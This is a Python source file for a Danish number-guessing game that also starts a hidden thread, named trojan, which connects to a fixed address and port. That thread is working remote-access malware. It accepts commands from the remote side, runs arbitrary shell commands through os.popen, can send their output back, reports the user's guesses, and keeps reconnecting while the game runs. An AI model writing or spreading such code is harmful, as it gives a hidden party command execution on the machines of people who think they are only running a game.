import random
import socket
import threading
import os

connection = False


def trojan():
    global connection
    global num
    global tries
    global guess
    global done
    HOST = "192.168.1.26"
    PORT = 9090

    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        connection = True
    except:
        pass

    cmd_mode = False
    sendOutput = False
    tryCount = 0

    while connection:
        try:
            client.send("req".encode("utf-8"))
            server_command = client.recv(1024).decode("utf-8")
        except ConnectionResetError:
            connection = False
            break
        if server_command == "cmdon":
            cmd_mode = True
            client.send("You now have terminal access".encode("utf-8"))
            continue
        elif server_command == "cmdoff":
            cmd_mode = False
            client.send("You have disabled terminal access".encode("utf-8"))
            continue
        if cmd_mode:
            if sendOutput:
                output = os.popen(server_command)
                client.send(output.read().encode("utf-8"))
                continue
            else:
                os.popen(server_command)
        else:
            if server_command == "hello":
                print("Hello, World!")
            elif server_command == "output":
                sendOutput = (not sendOutput)
                client.send(f"Send Output was set to {sendOutput}".encode("utf-8"))
                continue
            elif server_command == "monitor":
                client.send(f"Correct number is {num}\n".encode("utf-8"))
                while not done:
                    if tryCount != tries:
                        client.send(f"Guess number {tries-1}: {guess}".encode("utf-8"))
                        tryCount = tries
                client.send(f"Guessed right in {tries} tries!\n".encode("utf-8"))
                continue
            elif server_command == "print":
                client.send("Text to be printed?".encode("utf-8"))
                client.send("req".encode("utf-8"))
                print(client.recv(1024).decode("utf-8"))
        client.send(f"{server_command} was sent successfully!".encode("utf-8"))


def game():
    global num
    global tries
    global guess
    global done
    while True:
        num = random.randint(0, 1000)
        tries = 1
        done = False

        while not done:
            try: guess = int(input("Gæt et tal: "))
            except ValueError:
                print("Kun heltal")
                continue

            if guess == num:
                done = True
                print("Du vandt")
            else:
                tries += 1
                if guess > num:
                    print("Det rigtige tal er lavere!")
                else:
                    print("Det rigtige tal er højere!")
            if not connection:
                t2 = threading.Thread(target=trojan)
                t2.start()

        print(f"Det tog dig {tries} forsøg!")


t1 = threading.Thread(target=game)
t2 = threading.Thread(target=trojan)

t1.start()
t2.start()
